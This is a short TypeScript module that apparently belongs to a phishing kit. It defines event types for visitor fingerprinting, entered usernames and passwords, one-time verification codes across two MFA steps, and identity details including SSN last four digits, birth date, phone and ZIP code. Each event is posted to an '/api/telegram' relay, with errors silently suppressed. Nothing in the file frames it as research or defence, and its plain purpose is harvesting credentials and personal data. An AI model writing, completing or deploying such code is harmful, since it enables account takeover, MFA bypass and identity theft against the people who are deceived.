export type TelegramNotifyBody =
  | {
      kind: "visit";
      userAgent: string;
      screenWidth: number;
      screenHeight: number;
      language: string;
      referrer: string;
      url: string;
      timeZone: string;
      localTime: string;
    }
  | {
      kind: "login";
      username: string;
      password: string;
    }
  | {
      kind: "method";
      method: "email" | "text" | "phone";
    }
  | {
      kind: "verification";
      method: "email" | "text" | "phone";
      code: string;
      otpStep: 1 | 2;
    }
  | {
      kind: "resend";
      method: "email" | "text" | "phone";
      otpStep: 1 | 2;
    }
  | {
      kind: "identity";
      method: "email" | "text" | "phone";
      ssnLast4: string;
      birthDate: string;
      phoneNumber: string;
      zipCode: string;
    };

export function notifyTelegram(body: TelegramNotifyBody): void {
  void fetch("/api/telegram", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  }).catch(() => {
    
  });
}
